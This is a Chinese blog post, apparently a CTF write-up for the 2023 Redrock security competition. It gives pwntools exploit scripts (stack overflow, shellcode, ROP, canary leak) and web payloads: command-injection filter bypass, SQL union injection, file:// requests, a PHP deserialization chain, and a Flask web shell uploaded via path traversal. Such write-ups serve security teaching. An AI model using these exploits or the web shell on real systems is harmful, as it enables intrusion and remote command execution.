@@ -1,0 +1,1919 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>2023&#34;红岩杯&#34;信息安全竞赛 WriteUp | BetaCat&#39;s Blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://betacatiz.github.io/favicon.ico?v=1715055299943">
+<link rel="stylesheet" href="https://betacatiz.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+PWN
+
+Oceaner黑客少年传奇-烈焰序章
+Oceaner黑客少年传奇-雷霆觉醒
+right
+nun_game
+ezshellcode
+justsearch
+Onepiece
+fmt低配版
+
+
+WEB
+
+ez_php
+欸我flag呢
+..." />
+    <meta name="keywords" content="WP" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://betacatiz.github.io">
+        <img src="https://betacatiz.github.io/images/avatar.png?v=1715055299943" class="site-logo">
+        <h1 class="site-title">BetaCat&#39;s Blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="https://betacatiz.github.io" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      猫猫狗狗
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://betacat.top" target="_blank">BetaCat</a> | <a class="rss" href="https://betacatiz.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">2023&#34;红岩杯&#34;信息安全竞赛 WriteUp</h2>
+            <div class="post-date">2023-11-18</div>
+            
+            <div class="post-content" v-pre>
+              <p><ul class="markdownIt-TOC">
+<li><a href="#pwn"><strong>PWN</strong></a>
+<ul>
+<li><a href="#oceaner%E9%BB%91%E5%AE%A2%E5%B0%91%E5%B9%B4%E4%BC%A0%E5%A5%87-%E7%83%88%E7%84%B0%E5%BA%8F%E7%AB%A0">Oceaner黑客少年传奇-烈焰序章</a></li>
+<li><a href="#oceaner%E9%BB%91%E5%AE%A2%E5%B0%91%E5%B9%B4%E4%BC%A0%E5%A5%87-%E9%9B%B7%E9%9C%86%E8%A7%89%E9%86%92">Oceaner黑客少年传奇-雷霆觉醒</a></li>
+<li><a href="#right">right</a></li>
+<li><a href="#nun_game">nun_game</a></li>
+<li><a href="#ezshellcode">ezshellcode</a></li>
+<li><a href="#justsearch">justsearch</a></li>
+<li><a href="#onepiece">Onepiece</a></li>
+<li><a href="#fmt%E4%BD%8E%E9%85%8D%E7%89%88">fmt低配版</a></li>
+</ul>
+</li>
+<li><a href="#web"><strong>WEB</strong></a>
+<ul>
+<li><a href="#ez_php">ez_php</a></li>
+<li><a href="#%E6%AC%B8%E6%88%91flag%E5%91%A2">欸我flag呢</a></li>
+<li><a href="#%E5%8F%AF%E6%9B%BE%E5%90%AC%E9%97%BBping">可曾听闻ping？</a></li>
+<li><a href="#oceaner%E7%9A%84%E7%BD%91%E7%AB%99">oceaner的网站</a></li>
+<li><a href="#%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81flagweb%E7%89%88">点击就送flag（web版）</a></li>
+<li><a href="#%E4%BD%A0%E6%98%AFman%E5%90%97">你是man吗？</a></li>
+<li><a href="#easy-sql">easy sql</a></li>
+<li><a href="#%E4%BD%A0%E6%98%AF%E4%B8%80%E4%B8%AA%E7%9C%9F%E6%AD%A3%E7%9A%84man%E5%90%97">你是一个真正的man吗？</a></li>
+<li><a href="#%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84%E4%BD%9C%E4%B8%9A">看看你的作业</a></li>
+<li><a href="#%E6%88%91%E6%96%B0%E5%AD%A6%E7%9A%84flask">我新学的flask</a></li>
+</ul>
+</li>
+<li><a href="#reverseak"><strong>REVERSE（AK）</strong></a>
+<ul>
+<li><a href="#oceaner%E7%9A%84%E6%80%9C%E6%82%AF">Oceaner的怜悯</a></li>
+<li><a href="#oceaner%E7%9A%84%E4%BB%81%E6%85%88">Oceaner的仁慈</a></li>
+<li><a href="#%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81flag">点击就送flag</a></li>
+<li><a href="#easyre">EasyRE</a></li>
+<li><a href="#do_u_know_upx">Do_U_know_UPX</a></li>
+<li><a href="#do-you-like-jiaran">Do you like Jiaran?</a></li>
+<li><a href="#native-jvav">native jvav</a></li>
+<li><a href="#easypy">easypy</a></li>
+<li><a href="#strangebroadcast">StrangeBroadcast</a></li>
+<li><a href="#tiger">Tiger</a></li>
+</ul>
+</li>
+<li><a href="#crypto"><strong>CRYPTO</strong></a>
+<ul>
+<li><a href="#easy_base">easy_base</a></li>
+<li><a href="#easy_caesar">easy_caesar</a></li>
+<li><a href="#easy_morse">easy_morse</a></li>
+<li><a href="#easy_passwd">easy_passwd</a></li>
+<li><a href="#easy_rsa">easy_rsa</a></li>
+<li><a href="#easy_wfa">easy_wfa</a></li>
+<li><a href="#easy_pow">easy_pow</a></li>
+<li><a href="#leak_d">leak_d</a></li>
+<li><a href="#easy_dhke">easy_dhke</a></li>
+</ul>
+</li>
+<li><a href="#miscak"><strong>MISC（AK）</strong></a>
+<ul>
+<li><a href="#easy_qrcode">easy_qrcode</a></li>
+<li><a href="#easy_traffic">easy_traffic</a></li>
+<li><a href="#easy_unpack">easy_unpack</a></li>
+<li><a href="#easy_wordle">easy_wordle</a></li>
+<li><a href="#easy_zip">easy_zip</a></li>
+<li><a href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E5%A3%B0%E9%9F%B3">神秘的声音</a></li>
+<li><a href="#%E5%93%AA%E9%87%8C%E9%9A%BE%E4%BA%86">哪里难了？</a></li>
+<li><a href="#checkin">CheckIn</a></li>
+<li><a href="#%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5">问卷调查</a></li>
+<li><a href="#yyz%E6%83%B3%E8%A6%81%E5%9B%9E%E5%88%B0%E8%BF%87%E5%8E%BB">yyz想要回到过去</a></li>
+<li><a href="#%E6%B5%B7%E7%87%95%E7%9A%84%E7%A7%98%E5%AF%86">海燕的秘密</a></li>
+<li><a href="#easy_maze">easy_maze</a></li>
+<li><a href="#3g%E4%B9%8B%E5%89%8D%E6%98%AF%E4%BB%80%E4%B9%88">3G之前是什么</a></li>
+<li><a href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81">内存取证</a></li>
+<li><a href="#%E5%A4%A7%E9%9B%AA%E6%A0%91%E9%94%AF%E7%BB%93%E6%9E%84">大雪树锯结构</a></li>
+</ul>
+</li>
+</ul>
+</p>
+<h1 id="pwn"><strong>PWN</strong></h1>
+<h2 id="oceaner黑客少年传奇-烈焰序章">Oceaner黑客少年传奇-烈焰序章</h2>
+<p>nc连接服务器 cat flag<br>
+tips:连接后只能输入一个命令</p>
+<h2 id="oceaner黑客少年传奇-雷霆觉醒">Oceaner黑客少年传奇-雷霆觉醒</h2>
+<p>nc连接进去后，是计算游戏。</p>
+<p>静态分析之后，发现114次后终止，并获得权限</p>
+<p>写一个脚本来执行操作</p>
+<pre><code class="language-python">from pwn import *
+import re
+
+# context.log_level = 'DEBUG'
+
+host = '172.20.14.117'
+port = 10517
+
+conn = remote(host, port)
+
+def solve_expression(expr):
+    match = re.match(r'(\d+)\s*([+\-*/])\s*(\d+)', expr)
+    if match:
+        a, operator, b = match.groups()
+        a, b = int(a), int(b)
+
+        if operator == '+':
+            return str(a + b)
+        elif operator == '-':
+            return str(a - b)
+        elif operator == '*':
+            return str(a * b)
+        elif operator == '/':
+            return str(a // b)
+    else:
+        raise ValueError(&quot;Invalid expression&quot;)
+
+try:
+    k = 0
+    while True:
+        k = k + 1
+        challenge = conn.recvuntil(b' = ?').decode('utf-8').strip()
+        print(f&quot;Received challenge{k}: {challenge}&quot;)
+
+        expression = challenge.split('how to calculate ')[-1]
+
+        answer = solve_expression(expression)
+        conn.sendline(answer)
+
+        output = conn.recvline().decode('utf-8').strip()
+        print(output)
+        if k == 114:
+            print(&quot;Switching to interactive mode&quot;)
+            conn.interactive()
+            break
+
+except EOFError:
+    print(&quot;Connection closed by the remote host.&quot;)
+
+finally:
+    conn.close()
+</code></pre>
+<h2 id="right">right</h2>
+<p>栈溢出题</p>
+<pre><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[32]; // [rsp+0h] [rbp-20h] BYREF
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  setbuf(stderr, 0LL);
+  puts(&quot;so please tell me what you want to tell me&quot;);
+  gets(v4);
+  puts(&quot;well what you say is right,but not right enough&quot;);
+  return 0;
+}
+</code></pre>
+<p>超过32个字符溢出</p>
+<p>后门函数 401156开始</p>
+<p>编写脚本 64位程序</p>
+<pre><code class="language-python">from pwn import *
+
+r = remote('172.20.14.117',19966)
+
+addr = 0x401157 		#栈对齐
+
+payload = b'a'*(50)
+
+payload = payload + p64(addr)
+
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+<h2 id="nun_game">nun_game</h2>
+<p>flag:flag{well_done}</p>
+<p>一道游戏题</p>
+<p>分析并修复main函数</p>
+<pre><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+	unsigned int v3; // eax
+	int tmp1; // ebx
+	int tmp2; // ebx
+	int rand_0_3; // eax
+	char v8; // r12
+	unsigned __int64 t2; // rbx
+	size_t len; // rax
+	size_t t; // rbx
+	char s[112]; // [rsp+0h] [rbp-120h] BYREF
+	char leak[108]; // [rsp+70h] [rbp-B0h] BYREF
+	int input; // [rsp+DCh] [rbp-44h] BYREF
+	char *data1; // [rsp+E0h] [rbp-40h]
+	int index_1; // [rsp+ECh] [rbp-34h]
+	unsigned int i; // [rsp+F0h] [rbp-30h]
+	unsigned int boss_defence; // [rsp+F4h] [rbp-2Ch]
+	unsigned int boss_attack; // [rsp+F8h] [rbp-28h]
+	unsigned int boss_health; // [rsp+FCh] [rbp-24h]
+	unsigned int my_defence; // [rsp+100h] [rbp-20h]
+	unsigned int my_attack; // [rsp+104h] [rbp-1Ch]
+	unsigned int my_health; // [rsp+108h] [rbp-18h]
+	__int64 value; // [rsp+10Ch] [rbp-14h]
+    LODWORD(value) = 0;
+	input = 0;
+	my_health = 100;
+	my_attack = 10;
+	my_defence = 5;
+	boss_health = 9999;
+	boss_attack = 99;
+	boss_defence = 9;
+	v3 = time(0LL);
+	srand(v3);
+	puts(&amp;::s);
+    for ( i = 1; (int)i &lt;= 5; ++i )
+{
+	printf(&quot;round_%d\n&quot;, i);
+	puts(asc_402060);
+	printf(&amp;byte_402098, my_health, my_attack, my_defence);
+	printf(aBoss, boss_health, boss_attack, boss_defence);
+	puts(asc_402110);
+	puts(
+	&quot;1.连续攻击(造成攻击力的伤害5次)\t2.穿甲重击（攻击力X5）\t3.战术应急（使敌人攻击大幅度减低）&quot;); //第一行
+	puts(&quot;4.松果糖豆闪电鞭(造成750伤害)\t5.盾剑冲击（攻击力减半，造成防御力之差X10的伤害）&quot;);
+	puts(&quot;6.“如来”打法（削弱敌人防御，并提升自己防御）\t7.一束哀悼（敌人生命值降低，自己攻击力提升）&quot;);
+   	puts(&quot;8.不稳定爆破（造成随机伤害）\t9.TC公司干扰协议（双方数值都大幅度提升）&quot;);
+	puts(&quot;10.开摆（双方最大生命减半，防御力大幅提升）&quot;); // 输出最后一行
+    if ( (my_health &amp; 0x80000000) != 0 )
+	{
+		puts(&quot;game over&quot;);
+		__isoc99_scanf(&quot;%d&quot;, &amp;input);
+		return 0;
+	}
+	__isoc99_scanf(&quot;%d&quot;, &amp;input);
+	switch ( input )
+	{
+		case 1: // boss受我五倍伤害
+		boss_health += 5 * (boss_defence - my_attack);
+		break;
+		case 2:
+		my_attack *= 5; // 我攻击*5
+		break;
+		case 3:
+		boss_attack = (int)(0.1 * (double)(int)boss_attack);// boss攻击*0，1
+		break;
+		case 4: // boss受750
+		boss_health -= 750;
+		break;
+		case 5:
+		my_attack = (int)(0.5 * (double)(int)my_attack);// 我的攻击弱化，但是boss血量如果防御比我少时减少10倍差值
+		boss_health += 10 * (boss_defence - my_defence);
+		break;
+		case 6: // 我的防御*2 boss防御*0.1
+		my_defence *= 2;
+		boss_defence = (int)(0.1 * (double)(int)boss_defence);
+		break;
+		case 7:
+		boss_health = (int)(0.8 * (double)(int)boss_health);// boss血量*0.8 我攻击+50
+		my_attack += 50;
+		break;
+		case 8: // boss血量随机减少，最少50，最多3200
+		tmp1 = rand() % 4 + 1;
+		tmp2 = (rand() % 4 + 1) * tmp1;
+		boss_health -= 50 * tmp2 * (rand() % 4 + 1);
+		break;
+		case 9: // 大家都*30属性
+		my_health *= 30;
+		my_attack *= 30;
+		my_defence *= 30;
+		boss_health *= 30;
+		boss_attack *= 30;
+		boss_defence *= 30;
+		break;
+		case 10: // 都时血量*0.6，防御*3
+		boss_health = (int)(0.6 * (double)(int)boss_health);
+		my_health = (int)(0.6 * (double)(int)my_health);
+		my_defence *= 3;
+		boss_defence *= 3;
+		break;
+         default:
+		boss_health += 20 * (my_defence - my_attack);
+		break;
+	}
+	rand_0_3 = rand() % 4;
+    if ( rand_0_3 == 3 ) // boss攻击力翻倍，我收伤害*0.5
+	{
+		boss_attack *= 2;
+		printf(&quot;boss使用了力量化，boss攻击力变为%d\n&quot;, boss_attack);
+		my_health = (int)(0.5 * (double)(int)(my_defence - boss_attack) + (double)(int)my_health);
+	}
+	else if ( rand_0_3 &lt;= 3 )
+	{
+		if ( rand_0_3 == 2 )
+		{ 		// 我的攻击弱化为0.1，且boss攻击我*0.5
+			my_attack = (int)my_attack / 10;
+			printf(&quot;boss使用了防爆破探针，你的攻击力降低为%d\n&quot;, my_attack);
+			my_health = (int)(0.5 * (double)(int)(my_defence - boss_attack) +(double(int)my_health);
+		}
+		else if ( rand_0_3 )
+		{
+			if ( rand_0_3 == 1 )
+			{
+				boss_defence *= 10; // boss防御*10，且我承受0.5
+				printf(&quot;boss使用了防御计划，boss的防御力变为了%d\n&quot;, boss_defence);
+				my_health = (int)(0.5 * (double)(int)(my_defence - boss_attack) +(double)(int)my_health);
+			}
+		}
+		else // 随机为0时，我的血量+=我的防御-boss攻击（承受所有伤害）
+		{
+			my_health += my_defence - boss_attack;
+			printf(&quot;boss使用了普通攻击，你的生命值变为了%d\n&quot;, my_health);
+		}
+	}
+	LODWORD(value) = 10 * value + input; // 记录我的选择
+	}
+	puts(asc_402060);
+	printf(&amp;byte_402098, my_health, my_attack, my_defence);
+	printf(aBoss, boss_health, boss_attack, boss_defence);
+	if ( (boss_health &amp; 0x80000000) == 0 )
+	{
+		puts(&quot;time up,you lose&quot;);
+		__isoc99_scanf(&quot;%d&quot;, &amp;input);
+		return 0;
+	}
+	else // boss死后
+	{
+		puts(aWellDone);
+		sprintf(s, &quot;%d&quot;, (unsigned int)value); // value格式化后写进s
+		data1 = &quot;UUX^BD\\UUfWVW\\D&quot;;
+		for ( index_1 = 0; ; ++index_1 )
+         {
+			t = index_1;
+			if ( t &gt;= strlen(data1) )
+			break;
+			v8 = data1[index_1];
+			t2 = index_1;
+			len = strlen(s);
+			leak[index_1] = s[t2 % len] ^ v8; // encode
+		}
+		puts(leak);
+		__isoc99_scanf(&quot;%d&quot;, &amp;input);
+		return 0;
+	}
+}
+
+</code></pre>
+<p>其中有一部分关键代码</p>
+<pre><code class="language-c++">else // boss死后
+	{
+		puts(aWellDone);
+		sprintf(s, &quot;%d&quot;, (unsigned int)value); // value格式化后写进s
+		data1 = &quot;UUX^BD\\UUfWVW\\D&quot;;
+		for ( index_1 = 0; ; ++index_1 )
+         {
+			t = index_1;
+			if ( t &gt;= strlen(data1) )
+			break;
+			v8 = data1[index_1];
+			t2 = index_1;
+			len = strlen(s);
+			leak[index_1] = s[t2 % len] ^ v8; // encode
+		}
+		puts(leak);
+		__isoc99_scanf(&quot;%d&quot;, &amp;input);
+		return 0;
+	}
+</code></pre>
+<p>这里面是一段解密，对于密文根据我们前面的选择进行解密，并输出</p>
+<p>结合Hint：可以穷举？但是number不能太大？</p>
+<p>直接爆破得到s为39999</p>
+<p>然后逆向解密即可</p>
+<pre><code class="language-python">data1 = [0x55, 0x55, 0x58, 0x5E, 0x42, 0x44, 0x5C, 0x55, 0x55, 0x66, 0x57, 0x56,0x57, 0x5C, 0x44]
+
+#flag = 'flag{'
+
+s = '39999'
+
+#for i in range(len(flag)):
+#	s+=chr(data1[i]^ord(flag[i]))
+#	print(s)
+
+leak = [0]*len(data1)
+
+for i in range(len(data1)):
+	leak[i] = ord(s[i % len(s)]) ^ data1[i]
+
+print(''.join(chr(a) for a in leak))
+</code></pre>
+<h2 id="ezshellcode">ezshellcode</h2>
+<p>分析main函数</p>
+<pre><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[56]; // [rsp+0h] [rbp-40h] BYREF
+  void *buf; // [rsp+38h] [rbp-8h]
+
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  setbuf(stderr, 0LL);
+  buf = (void *)(int)mmap((void *)0x405000, 0x1000uLL, 7, 34, -1, 0LL);
+  puts(&quot;Plant your bombs!&quot;);
+  read(0, buf, 0x30uLL);
+  puts(&quot;Light your bombs!&quot;);
+  read(0, v4, 0x100uLL);
+  puts(&quot;bye!&quot;);
+  return 0;
+}
+</code></pre>
+<p>有两个read，一个mmap，输入0x30字符，一个栈溢出，输入0x100字符。</p>
+<p>根据hint：如果我在那里存放一个shellcode，再跳转过去发发生什么呢</p>
+<p>可以猜测，第二个read函数可以用来执行存放在第一个read函数里的shellcode</p>
+<p>编写脚本</p>
+<pre><code class="language-python">from pwn import *
+from pwn import p64
+
+context.arch='amd64'
+
+addr = 0x405000
+
+r = remote (&quot;172.20.14.117&quot;,47223)
+
+shellcode = asm(shellcraft.sh())
+
+payload = shellcode
+payload = payload + b&quot;a&quot; * (48 - len(shellcode))
+r.send(payload)
+
+payload = b&quot;b&quot; * 64 + b&quot;c&quot; * 8
+payload = payload + p64(addr)
+r.send(payload)
+
+r.interactive()
+</code></pre>
+<h2 id="justsearch">justsearch</h2>
+<p>分析main函数</p>
+<pre><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
+  const char *v5; // [rsp+18h] [rbp-8h]
+
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  setbuf(stderr, 0LL);
+  v5 = &quot;/bin/sh&quot;;
+  puts(&quot;now please tell me how much stars are in the space&quot;);
+  read(0, buf, 0x60uLL);
+  puts(&quot;I think it is more&quot;);
+  return 0;
+}
+</code></pre>
+<p>有个栈溢出，还给了个后门函数，同时提供了binsh字符串</p>
+<p>根据hint：构造rop链</p>
+<p>直接用它的binsh构造rop链</p>
+<p>通过ROPgadget找到了pop_rdi_ret这个gadget</p>
+<p>直接通过pop rdi 将binsh入栈再通过直接执行system即可</p>
+<pre><code class="language-python">from pwn import *
+
+sh=remote(&quot;172.20.14.117&quot;,62755)
+
+context.log_level='debug'
+context.arch='amd64'
+
+backdoor_addr=0x401237
+pop_rdi_addr=0x4012a3
+sh.recvline()
+
+payload = b'\x00'*40 + p64(pop_rdi_addr) + p64(0x402008) + p64(backdoor_addr)
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+<h2 id="onepiece">Onepiece</h2>
+<p>给了个地址应该是后门，并根据提示可以猜到需要猜测栈上写的地址和后门的距离差</p>
+<p>因此直接对于栈上空间大量的覆盖后门地址就行，由于栈的对齐机制，所以前面的数据肯定是8/4字节对齐的，所以直接用后门地址大量填充即可</p>
+<p>这里猜测是64位的程序，就直接通过p64的地址大量填充即可</p>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = 'debug'
+
+addr = 0x40119e
+
+r=remote(&quot;172.20.14.117&quot;,33248)
+
+payload = p64(0x40119e)*0x100
+r.recvuntil(b'\x81\x0a')
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+<h2 id="fmt低配版">fmt低配版</h2>
+<p>分析main函数</p>
+<pre><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 buf; // [rsp+0h] [rbp-40h] BYREF
+  __int64 v5[6]; // [rsp+10h] [rbp-30h] BYREF
+
+  v5[5] = __readfsqword(0x28u);
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  setbuf(stderr, 0LL);
+  printf(&quot;please tell me your name &quot;);
+  read(0, &amp;buf, 0x10uLL);
+  printf(&quot;hello!&quot;);
+  printf((const char *)&amp;buf);
+  printf(&quot;Please tell me what you want.&quot;);
+  gets(v5);
+  printf(&quot;Let's see if you get it&quot;);
+  return 0;
+}
+</code></pre>
+<p>可以通过格式化字符串泄露canary，再通过栈溢出修改ret到后门，</p>
+<p>经过gef的插件测出canary可以通过<code>%13$p</code>来泄露</p>
+<p>但是这个题的存在栈对齐问题，再加一个ret就行</p>
+<pre><code class="language-python">from pwn import *
+sh=process(&quot;./fmt2&quot;)
+
+#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+#sh=remote(&quot;addr&quot;,port)
+def debug():
+    gdb.attach(sh,&quot;b *0x401287&quot;)
+
+context.log_level='debug'
+context.arch='amd64'
+#debug()
+
+sh.recvuntil(b'name ')
+sh.sendline(b'%13$p')
+canary=sh.recvuntil(b'\n').split(b'!')[1][-17:]
+canary_value = int(canary, 16)
+
+success(&quot;canary=&gt;&quot;+str(canary))
+payload=7*p64(canary_value)+p64(0x4012C8)+p64(0x4012C9)
+#sh.recvline()
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<h1 id="web"><strong>WEB</strong></h1>
+<h2 id="ez_php">ez_php</h2>
+<p>flag:redrock{W0w_u_hav3_s0ved_7h1s!}</p>
+<p>绕过第一个 找到两个md5相同的字符串</p>
+<pre><code>a1=QNKCDZO&amp;a2=240610708
+</code></pre>
+<p>绕过第二个 cookie 设置 b 的值为 <code>114514.1</code></p>
+<p>绕过第三个 hackbar POST</p>
+<pre><code>file=data://text/plain,I wanna the last key
+</code></pre>
+<h2 id="欸我flag呢">欸我flag呢</h2>
+<p>flag:redrock{7hank_u_f1nd_1t_f0r_tiger}</p>
+<p>dirsearch目录扫描</p>
+<h2 id="可曾听闻ping">可曾听闻ping？</h2>
+<p>cmd ping 命令 查询IP</p>
+<p><code>172.20.14.2</code></p>
+<pre><code>172.20.14.2 | ls
+</code></pre>
+<p>发现index.php</p>
+<pre><code>172.20.14.2 | ca''t index.php
+</code></pre>
+<p>发现源码</p>
+<pre><code class="language-php">			&lt;?php
+				error_reporting(0);
+				header(&quot;Content-type:text/html;charset=utf-8&quot;);
+				$ip = $_POST['ip'];
+				if (isset($ip))
+				{
+					if (preg_match('/(fl4g|cat)/i',$ip)) {
+						die(&quot;才不会让你这么轻易拿到flag！&quot;);
+					}
+					$cmd = &quot;ping -c 1 &quot;.$ip;
+					$ret = system($cmd);
+					$ret = iconv(&quot;GBK&quot;, &quot;UTF-8&quot;, $ret);
+					echo $ret;
+				}
+				?&gt;
+</code></pre>
+<pre><code>127.20.14.2 | ca''t /f''l4g
+</code></pre>
+<p>得到flag</p>
+<h2 id="oceaner的网站">oceaner的网站</h2>
+<p>flag:redrock{F12_is_c0nv3n1ent}</p>
+<p>F12或者查看源码</p>
+<h2 id="点击就送flagweb版">点击就送flag（web版）</h2>
+<p>flag:redrock{js_1s_s0_e@syyyy}</p>
+<p>查看js源码</p>
+<pre><code class="language-javascript">//游戏胜利条件
+		if (count &gt;= 50) {
+			findFlag();
+		} else {
+			alert(&quot;失败！点击确定刷新页面&quot;);
+			//刷新页面
+			location.reload();
+		}
+	}, 5000);
+</code></pre>
+<p>count&gt;=50就可满足条件</p>
+<p>开始游戏后 控制台输入<code>count=50</code></p>
+<h2 id="你是man吗">你是man吗？</h2>
+<p>hackbar POST</p>
+<pre><code>url=file:////flag
+</code></pre>
+<h2 id="easy-sql">easy sql</h2>
+<p>sql注入问题</p>
+<p>联合注入</p>
+<pre><code>-1 union select 1,group_concat(flag) from flag
+</code></pre>
+<h2 id="你是一个真正的man吗">你是一个真正的man吗？</h2>
+<p>hackbar POST</p>
+<pre><code>url=fil''e:////flag
+</code></pre>
+<h2 id="看看你的作业">看看你的作业</h2>
+<p>构造pop链</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+
+class Wode
+{
+	public $name;
+	public function __construct(){
+	$this-&gt;name=new Homework();
+	}
+}
+class Homework
+{
+	public $yes;
+	public function __construct(){
+	$this-&gt;yes=new System();
+	}
+}
+class System
+{
+
+}
+
+echo serialize(new Wode());
+</code></pre>
+<p>得到</p>
+<pre><code class="language-php">O:4:&quot;Wode&quot;:1:{s:4:&quot;name&quot;;O:8:&quot;Homework&quot;:1:{s:3:&quot;yes&quot;;O:6:&quot;System&quot;:0:{}}}
+</code></pre>
+<p>发现一个路由:WH47/Y0u/Kn0W/7H3/P0p/main.php?5Y573M=</p>
+<p>但是只能执行4个字符,一开始想的是4字符RCE,但是靶机好像不出网或者当前目录的两个文件导致我ls -t命令没有正确执行</p>
+<p>根据题目提示flag应该就在wh4tY0U3V3nKn0WM3.php</p>
+<p><code>nl *</code></p>
+<p>查看源码 得到flag</p>
+<h2 id="我新学的flask">我新学的flask</h2>
+<p>它开了debug,尝试报错来让它回显源代码,但是这题报错只是前端回显error,所以需要抓包来看</p>
+<p>在查看文件的地方直接把文件名后加个%00截断:</p>
+<pre><code class="language-python">with open(app.config['UPLOAD_FOLDER'] + &quot;/&quot; + filename, 'rb') as file:
+image_data = file.read()&lt;/pre&gt;
+base64_data = base64.b64encode(image_data).decode('utf-8')
+return render_template_string(&quot;&lt;img src='data:image/jpg;base64,{{
+base64_data }}'&gt;&quot;,
+</code></pre>
+<p>在上次文件的地方把文件名魔改一下尝试报错:</p>
+<pre><code class="language-javascript">app.config[&amp;#39;MAX_CONTENT_LENGTH&amp;#39;] = 64 * 1024 * 1024 # 限制大小64mb&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;@app.route(&amp;#39;/&amp;#39;, methods=
+[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def upload_file():&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt; &lt;/span&gt;if request.method == &amp;#39;POST&amp;#39;:
+&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt; &lt;/span&gt;file =
+request.files[&amp;#39;file&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt; &lt;/span&gt;if file:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt; &lt;/span&gt;filename =
+file.filename&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt; &lt;/span&gt;filename = str(filename) #
+防止恶意传送非正常字符导致服务器异常&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;
+&lt;/span&gt;file.save(os.path.join(app.config[&amp;#39;UPLOAD_FOLDER&amp;#39;], filename))&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt; &lt;/span&gt;return
+render_template(&amp;#34;index.html&amp;#34;, uploadSuccess=True,filename=filename)
+</code></pre>
+<p>注意这里的 <code>file.save(os.path.join(app.config[&amp;#39;UPLOAD_FOLDER&amp;#39;], filename))</code></p>
+<p>根据题目提示的目录穿越,这里一看就是可以把文件传到根目录</p>
+<p>写一个py脚本</p>
+<pre><code class="language-python">from flask import Flask, request
+import os
+app = Flask(__name__)
+@app.route('/')
+def index():
+    try:
+        shell = request.args.get(&quot;rce&quot;)
+        data = os.popen(shell).read()
+        return data
+    except:
+        pass
+    return &quot;ok!!!&quot;
+if __name__ == &quot;__main__&quot;:
+    app.run(host='0.0.0.0',debug=True,port=5000)
+</code></pre>
+<p>最后进行改名为<code>../app.py</code>进行上传</p>
+<p><code>?rce=cat /This_1S_TrUe_FlAg</code></p>
+<h1 id="reverseak"><strong>REVERSE（AK）</strong></h1>
+<h2 id="oceaner的怜悯">Oceaner的怜悯</h2>
+<p>flag:Redrock{re_15_ea5yToT}</p>
